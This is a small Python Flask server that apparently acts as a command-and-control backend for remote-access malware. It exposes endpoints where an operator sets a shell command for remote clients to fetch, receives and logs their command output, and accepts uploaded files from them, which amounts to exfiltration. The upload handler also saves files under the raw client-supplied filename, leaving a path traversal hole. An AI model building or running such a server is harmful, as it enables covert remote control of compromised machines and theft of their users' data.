from flask import Flask, request, jsonify

app = Flask(__name__)

current_command = ""
output_log_file = "./command_output.log"

@app.route('/command', methods=['GET'])
def get_command():
    """ print current command """
    global current_command
    return current_command

@app.route('/result', methods=['POST'])
def post_result():
    """ print command output """
    global current_command
    output = request.form.get("output", "")
    print(f"COMMAND OUTPUT:\n{output}")
    with open(output_log_file, "a") as log_file:
        log_file.write(f"COMMAND OUTPUT:\n{output}\n\n")
    current_command = ""
    return "OK"

@app.route('/set_command', methods=['POST'])
def set_command():
    """ set new command """
    global current_command
    command = request.form.get("command", "")
    if command:
        current_command = command
        print(f"New command: {command}")
        return "", 200
    else:
        return "Error!\n", 400

@app.route('/upload_file', methods=['POST'])
def upload_file():
    """ receive a file"""
    if 'file' not in request.files:
        return jsonify({"error": "No file part in the request"}), 400
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
     
    file_path = f"./uploaded_files/{file.filename}"
    try:
        file.save(file_path)
        print(f"File saved to {file_path}")
        return jsonify({"message": "File uploaded successfully", "file_path": file_path}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    print("Server started on port 80...")
    app.run(host="0.0.0.0", port=80)